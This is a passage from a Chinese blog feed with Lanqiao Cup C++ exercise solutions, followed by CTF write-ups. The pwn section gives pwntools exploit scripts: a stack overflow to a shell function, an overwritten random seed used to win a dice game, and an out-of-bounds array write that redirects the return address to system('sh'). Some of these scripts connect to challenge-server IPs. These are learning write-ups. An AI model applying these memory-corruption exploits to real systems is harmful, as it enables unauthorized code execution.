本题直接的想法是直接使用一个循环来累加，然而，当数据规模很大时，这种“暴力”的方法往往会导致超时。此时你需要想想其他方法。你可以试一试，如果使用1000000000作为你的程序的输入，你的程序是不是能在规定的上面规定的时限内运行出来。</p><p> 本题另一个要值得注意的地方是答案的大小不在你的语言默认的整型(int)范围内，如果使用整型来保存结果，会导致结果错误。</p><p> 如果你使用C++或C语言而且准备使用printf输出结果，则你的格式字符串应该写成%I64d以输出long long类型的整数。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> a, b;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">b = a * (a + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BEGIN-3-圆的面积"><a href="#BEGIN-3-圆的面积" class="headerlink" title="BEGIN-3    圆的面积"></a>BEGIN-3    圆的面积</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br>给定圆的半径r，求圆的面积。</p></li><li><p>输入格式<br> 输入包含一个整数r，表示圆的半径。</p></li><li><p>输出格式<br> 输出一行，包含一个实数，四舍五入保留小数点后7位，表示圆的面积。<br> 说明：在本题中，输入是一个整数，但是输出是一个实数。</p><p> 对于实数输出的问题，请一定看清楚实数输出的要求，比如本题中要求保留小数点后7位，则你的程序必须严格的输出7位小数，输出过多或者过少的小数位数都是不行的，都会被认为错误。</p><p> 实数输出的问题如果没有特别说明，舍入都是按四舍五入进行。</p></li><li><p>样例输入<br> 4</p></li><li><p>样例输出<br> 50.2654825</p></li><li><p>数据规模与约定<br> 1 &lt;= r &lt;= 10000。<br> 提示<br> 本题对精度要求较高，请注意π的值应该取较精确的值。你可以使用常量来表示π，比如PI=3.14159265358979323，也可以使用数学公式来求π，比如PI=atan(1.0)*4。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PI 3.14159265358979323</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line"><span class="keyword">double</span> s = PI * a * a;</span><br><span class="line"><span class="built_in">cout</span>.precision(<span class="number">7</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; fixed &lt;&lt; s;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="BEGIN-4-Fibonacci数列"><a href="#BEGIN-4-Fibonacci数列" class="headerlink" title="BEGIN-4    Fibonacci数列"></a>BEGIN-4    Fibonacci数列</h1><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">问题描述</button></li><li class="tab"><button type="button" data-href="#test1-2">代码</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><ol><li><p>资源限制<br> 时间限制：1.0s   内存限制：256.0MB</p></li><li><p>问题描述<br> Fibonacci数列的递推公式为：Fn=Fn-1+Fn-2，其中F1=F2=1。</p><p> 当n比较大时，Fn也非常大，现在我们想知道，Fn除以10007的余数是多少。</p></li><li><p>输入格式<br> 输入包含一个整数n。</p></li><li><p>输出格式<br> 输出一行，包含一个整数，表示Fn除以10007的余数。<br> 说明：在本题中，答案是要求Fn除以10007的余数，因此我们只要能算出这个余数即可，而不需要先计算出Fn的准确值，再将计算的结果除以10007取余数，直接计算余数往往比先算出原数再取余简单。</p></li><li><p>样例输入<br> 10</p></li><li><p>样例输出<br> 55</p></li><li><p>样例输入<br> 22</p></li><li><p>样例输出<br> 7704</p></li><li><p>数据规模与约定<br> 1 &lt;= n &lt;= 1,000,000。</p></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> arr[<span class="number">1000001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> a;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; a;</span><br><span class="line">arr[<span class="number">0</span>] = arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> i = <span class="number">2</span>; i &lt; a; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = ( arr[i - <span class="number">1</span>] + arr[i - <span class="number">2</span>]) % <span class="number">10007</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; (arr[a - <span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Programma </category>
          
          <category> lanqiaobei </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯 算法提高 ADV-374-水仙花数</title>
      <link href="2020/09/07/Programme/lanqiaobei/%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98/ADV-374-%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/"/>
      <url>2020/09/07/Programme/lanqiaobei/%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98/ADV-374-%E6%B0%B4%E4%BB%99%E8%8A%B1%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">9</span>; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;=<span class="number">9</span>; j++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>; k&lt;=<span class="number">9</span>; k++)</span><br><span class="line">                <span class="keyword">if</span>(i*i*i + j*j*j + k*k*k == i*<span class="number">100</span> + j*<span class="number">10</span> + k)</span><br><span class="line">                    <span class="built_in">cout</span> &lt;&lt; i*<span class="number">100</span> + j*<span class="number">10</span> + k &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Programma </category>
          
          <category> lanqiaobei </category>
          
          <category> 算法提高 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Programma </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界 pwn 进阶区（）</title>
      <link href="2020/07/25/CTF/xctf-jingjie-1/"/>
      <url>2020/07/25/CTF/xctf-jingjie-1/</url>
      
        <content type="html"><![CDATA[<div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">反应釜开关控制</button></li><li class="tab"><button type="button" data-href="#test1-2">dice_game</button></li><li class="tab"><button type="button" data-href="#test1-3">stack2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p>这个题呢，从题目描述可以看出来他是一个函数套函数的题<br>下载附件，咱们开始分析<br><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595663596.png"></p><p>可以看到是 64 位程序，只开了 NX ,并且可以发现他只有一个输入点</p><p>好的，掏出 IDA 我们开始刚，首先shift+f12 我们先看一下字符串，</p><p><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595664197.png"></p><p>阔以很明显发现有 system 和 /bin/sh<br>点进去后可以发现他就是获取 shell 的一个函数，那刚刚好，所以我们要做的就是让程序最终执行到这儿就行了</p><p>我们再来看看他的主函数</p><p><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595670592.png"></p><p>嗯……有一个gets，好了，还看啥呀，直接栈溢出就好</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;&quot;)</span></span><br><span class="line">r = process(<span class="string">&quot;./123&quot;</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x4005F6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x200</span>+<span class="number">8</span>) + p64(shell)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>效果如下<br><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595671341.png"><br>很简单的一道栈溢出题</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p>继续先看一下保护措施和运行一下程序<br><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595732008.png"><br>可以看到是的程序除了 canary 没开以外啥都开了，很难受，运行一下可以发现这是一个猜数字的游戏<br>基本信息搜集完成，我们用IDA打开看看<br>在字符串窗口里我们可以发现一个有意思的字符 “flag”<br>一路跟过去可以发现有一个函数，它可以直接打印 flag 信息，那我们要做的就是让程序执行到这儿，继续往上跟可以发现只要可以完成 50 次成功的猜数游戏就可以拿到 flag<br><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595734002.png"><br>接下来我们来分析程序内容<br>程序总的来说是由两个输入点：一个是程序刚开始输入的 <strong>name</strong> , 一个是猜数游戏时输入的数字<br><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595757005.png"><br>我们查看一下函数栈，发现 name 可以覆盖到 seed 种子，那只要我们把种子覆盖了，就相当于后面的猜数我们都知道了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>, <span class="number">32823</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./dice_game&quot;)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Welcome, let me know your name: &quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Give me the point(1~6): &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>结果演示：<br><img src= "/img/loading.gif" data-lazy-src="/pic/xctf_jingjie_1/BurYiA_1595922101.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p>哈，我又回来了<br>在借助了诸多wp后终于把这道题弄明白了，记录一下</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020012319461972.png" alt="在这里插入图片描述"></p><p>32位程序，有NX，有Canary。</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200123194841446.png" alt="在这里插入图片描述"></p><p>运行可以发现它可以创建一个存储数字的数组，创建好以后我们可以对其中的数据进行一些基本的操作，ok，接下来开始硬刚IDA</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200123195158401.png" alt="在这里插入图片描述"></p><p>通过观察<strong>main</strong>函数伪代码我们可以发现上图这个位置有点小问题<br>这个时对数据进行修改的部分的代码，但可以发现他并没有对<strong>v5</strong>这个变量进行审查。这代表着什么呢，这代表着我们可以修改<strong>数组</strong>以及<strong>数组后面的</strong>任何数据。<br>ok，接下来来思考如何利用这个点<br>在左侧的函数栏里我们可以发现一个有意思的函数名“<strong>hackhere</strong>”，点进去后可以发现里面有我们需要的<strong>system（“/bin/sh”）</strong>，那么思路就很清晰了，我们只要找到一个可以利用的函数，将它的返回值改成我们需要去的地方就行了</p><p>纵观全文可以发现能利用的也就<strong>main</strong>函数了，利用位置也就是上面我们发现有小问题的哪儿。<br>可以发现那一处是更改数组中元素的值，那么，如果要更改返回位置的话我们就要去计算<strong>main函数返回位置</strong>距离<strong>数组</strong>的偏移是多少了。</p><p>整个题的难点在我看来就是这儿了，不知道其他师傅怎么弄的，我是费了好半天功夫了(感谢那些写wp的师傅们，辛苦了)…<br>以下借助<strong>faceless</strong>师傅的思路和过程</p><p>因为程序在一开始会给数组赋初值，并且这个过程是我们可以参与的。<br>考虑到一般的数组赋值会从首位开始，我们可以猜想，如果我们知道我们写入程序的第一个数据的存储位置是否我们就知道了数组的首地址？</p><p>那么首先，我们来求这个地址</p><p>程序一开始会给数组赋值，我们来看一下这一块的伪代码和汇编</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126130108742.png" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020012613032891.png" alt="在这里插入图片描述"></p><p>从汇编中可以看到程序通过<strong>scanf</strong>将数据存储到栈中，然后通过<strong>eax</strong>和<strong>ecx</strong>将数据存储到<strong>eax</strong>中存放的地址中去（cl是ecx的低位）</p><p>那意味着在程序运行到<strong>0x080486D5</strong>的位置时，此时eax中存放的即时数组的首地址<br>linux下我们用gdb调试的看一下</p><p>我们在<strong>0x080486D5</strong>的位置下个断点，输入点全部输入1（如下）</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126131356919.png" alt="在这里插入图片描述"></p><p>我们来看看此时的各寄存器</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/202001261315394.png" alt="在这里插入图片描述"></p><p>可以看到此时寄存器ecx中就是我们输入的1，而eax中的地址是<strong>0xffffd5b8</strong></p><p>我们来验证一下看看我们做的对不对，分别看看这步前后栈中数据的变化</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126132059279.png" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126132117470.png" alt="在这里插入图片描述"></p><p>可以看到<strong>d5b8</strong>的位置数据由<strong>0x000000e0</strong>变成了<strong>0x00000001</strong>，说明我们找的没问题，ok，数组首地址找到了。<br>接下来的问题就是如何去找函数的返回地址了，这个就简单的多了，我们知道当函数运行到<strong>return</strong>语句的时候，栈顶一定是返回地址。<br>继续用gdb调试</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126132744221.png" alt="在这里插入图片描述"></p><p>通过esp我们知道这个值是<strong>0xffffd63c</strong>，和首地址做差是<strong>0x84</strong></p><p>ok，接下来就可以写exp了，通过其他师傅的wp和测试可以知道环境中是没有 <strong>/bin/sh</strong> 的，无伤大雅，我们利用它中间的sh就行，然后rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">54649</span>)</span><br><span class="line"><span class="comment">#r = process(&quot;./stack2&quot;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;How many numbers you have:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Give me your numbers\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">addr, num</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;5. exit\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;which number to change:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;new number:\n&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x84</span>, <span class="number">0x50</span>)</span><br><span class="line">change(<span class="number">0x85</span>, <span class="number">0x84</span>)</span><br><span class="line">change(<span class="number">0x86</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x87</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0x8c</span>, <span class="number">0x87</span>)</span><br><span class="line">change(<span class="number">0x8d</span>, <span class="number">0x89</span>)</span><br><span class="line">change(<span class="number">0x8e</span>, <span class="number">0x04</span>)</span><br><span class="line">change(<span class="number">0x8f</span>, <span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看看效果</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200126133427667.png" alt="在这里插入图片描述"></p><p>ok完结，有不清楚的可以留言讨论</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu re 前十道</title>
      <link href="2020/05/18/CTF/buu-re-1-10/"/>
      <url>2020/05/18/CTF/buu-re-1-10/</url>
      
        <content type="html"><![CDATA[<p>最近搞了一下buu的题，记录一下</p><h2 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h2><p>首先查一下壳以及其他相关信息<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589757804.png"><br>可以看到是 64 位程序，没壳，那就可以直接用IDA打开了</p><p>IDA一键F5<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589757813.png"><br>真·easyre</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>拿到题目，继续查壳，看信息<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589759515.png"><br>64位程序，没壳<br>IDA打开后找主函数逻辑，然后…..点了半天没找到<br>我们直接<strong>shift+F12</strong>查看字符串<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589759557.png"></p><p>阔以发现这里有一个关键字符串</p><blockquote><p>this is the right flag!</p></blockquote><p>点进去，x查看交叉引用便可以找到主函数<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589759589.png"></p><p>阔以看到的是在这个字符串上面有个 <strong>strcpy</strong> 对比，其中一个是我们输入的字符串，而另一个不出意外就是flag了，点进去看看<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589759608.png"></p><p>加上 flag 前缀后我们直接提交，但很难受的就是可以发现flag是错误的。<br>我们继续去分析他的主函数<br>在上面我们可以看到他对 flag 做了与一个操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">&#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = j_strlen(Str2);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt; v2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( Str2[j] == <span class="number">111</span> )</span><br><span class="line">        Str2[j] = <span class="number">48</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意他的第二个 if 判断，按 r 我们把 ascll 码变成字符，可以发现他是把字符串中的所有的 “o” 变成了 “0”<br>然后就不用我多说了吧，提交flag就行</p><h2 id="不一样的flag"><a href="#不一样的flag" class="headerlink" title="不一样的flag"></a>不一样的flag</h2><p>查壳，看信息<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589758255.png"><br>32位，没壳</p><p>IDA打开我们来分析逻辑<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589758359.png"></p><p>首先我们可以看到在下面他有提示让输入上下左右，其次在上面我们注意到有这么一行</p><blockquote><p>mov     ebx, offset __data_start__ ; “*11110100001010000101111#”</p></blockquote><p>注意最后的那个字符串基本是由 0 和 1 组成，并且首位是 * ，末尾是 #，那这个是绝对是个迷宫题没跑了<br>既然是迷宫题，我们就需要知道他是几行几列的迷宫题，这样我们才能去解<br>F5 分析逻辑，我们注意主函数最后的这一块<br><img src= "/img/loading.gif" data-lazy-src="/pic/buu_re_1_10/BurYiA1589758404.png"><br>可以看到迷宫的一层有5个字母，并且flag就是我们输入的内容<br>那显然迷宫就是这样的了</p><blockquote><p>*1111<br>01000<br>01010<br>00010<br>1111#</p></blockquote><p>flag 就不写了，扫一眼就出来了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统原理模拟测试题</title>
      <link href="2020/05/07/Class/caozuoxitongyuanli-kecheng/"/>
      <url>2020/05/07/Class/caozuoxitongyuanli-kecheng/</url>
      
        <content type="html"><![CDATA[<p>要考试了…慌</p><p>日后完善…..</p>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法与数据结构</title>
      <link href="2020/05/07/Class/suanfa-shujujiegou/"/>
      <url>2020/05/07/Class/suanfa-shujujiegou/</url>
      
